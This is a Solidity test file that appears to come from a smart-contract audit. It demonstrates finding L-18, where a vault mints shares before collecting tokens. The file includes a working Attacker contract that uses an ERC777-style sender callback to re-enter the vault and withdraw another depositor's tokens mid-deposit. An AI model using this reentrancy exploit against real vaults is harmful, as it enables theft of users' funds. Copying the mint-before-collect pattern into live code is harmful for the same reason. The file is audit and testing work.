// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { Vault } from "../../../../../../contracts/cap/Vault.sol";
import { BaseTest } from "../../../../../../test/shared/BaseTest.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface ISenderHook {
    function tokensToSend(address from, address to, uint256 amount) external;
}

/// @dev ERC777-style token: calls the sender's hook BEFORE moving balances on transferFrom.
contract CallbackToken is ERC20 {
    mapping(address => bool) public hooked;

    constructor() ERC20("CB", "CB") { }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function register() external {
        hooked[msg.sender] = true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (hooked[from]) ISenderHook(from).tokensToSend(from, to, amount);
        return super.transferFrom(from, to, amount);
    }
}

contract Attacker is ISenderHook {
    Vault internal vault;
    CallbackToken internal token;
    uint256 public seenBalance;
    uint256 public seenVaultTokens;
    uint256 public seenSupply;
    uint256 public seenOwnTokensMidFlight;
    bool internal inHook;

    constructor(Vault _vault, CallbackToken _token) {
        vault = _vault;
        token = _token;
        token.register();
        token.approve(address(vault), type(uint256).max);
    }

    function attack(uint256 amount) external {
        vault.deposit(address(token), amount, address(this));
    }

    function tokensToSend(address, address, uint256 amount) external override {
        if (inHook) return;
        inHook = true;
        // inside the callback: ERC-6909 already minted, underlying not yet received by the vault
        seenBalance = vault.balanceOf(address(this), address(token));
        seenVaultTokens = token.balanceOf(address(vault));
        seenSupply = vault.totalSupply(vault.id(address(token)));
        // withdraw against the not-yet-paid balance: pulls OTHER depositors' tokens out of the vault
        vault.withdraw(address(token), amount, address(this));
        seenOwnTokensMidFlight = token.balanceOf(address(this));
        inHook = false;
    }
}

/// @notice R2 port of round-1 WS-A VaultCallback (finding L-18). Vault.deposit mints before it
/// collects (Vault.sol:35-36, unchanged). With a sender-side callback token the depositor holds
/// ERC-6909 for tokens the vault does not yet have and can withdraw other depositors' tokens
/// mid-call. The outer transferFrom then repays them, so the end state reconciles.
contract L18_VaultCallbackTest is BaseTest {
    Vault internal vault;
    CallbackToken internal token;
    address internal victim = makeAddr("victim");

    function setUp() public {
        _setUpAccessManager();
        vault = Vault(_deployProxy(address(new Vault()), abi.encodeCall(Vault.initialize, (address(accessManager)))));
        token = new CallbackToken();
        token.mint(victim, 100e18);
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(address(token), 100e18, victim);
        vm.stopPrank();
    }

    function test_L18_mintBeforeTransfer_windowLetsDepositorWithdrawOthersTokens() public {
        Attacker a = new Attacker(vault, token);
        token.mint(address(a), 100e18);

        a.attack(100e18);

        emit log_named_uint("6909 balance seen mid-flight ", a.seenBalance());
        emit log_named_uint("vault tokens seen mid-flight ", a.seenVaultTokens());
        emit log_named_uint("6909 supply seen mid-flight  ", a.seenSupply());
        emit log_named_uint("attacker tokens after mid-flight withdraw", a.seenOwnTokensMidFlight());

        // during the hook the attacker held 100e18 of ERC-6909 while the vault had only the victim's 100e18
        assertEq(a.seenBalance(), 100e18, "minted before paid");
        assertEq(a.seenVaultTokens(), 100e18, "vault only held the victim's tokens");
        assertEq(a.seenSupply(), 200e18, "6909 supply exceeded token balance (I12 broken in-window)");
        assertEq(a.seenOwnTokensMidFlight(), 200e18, "held own 100 + victim's 100 mid-call");

        // end state: reconciles, because the outer transferFrom still pulls the attacker's tokens
        assertEq(token.balanceOf(address(vault)), 100e18);
        assertEq(vault.balanceOf(address(a), address(token)), 0);
        assertEq(vault.totalSupply(vault.id(address(token))), 100e18);
        // I12 at rest
        assertGe(token.balanceOf(address(vault)), vault.totalSupply(vault.id(address(token))));
    }
}
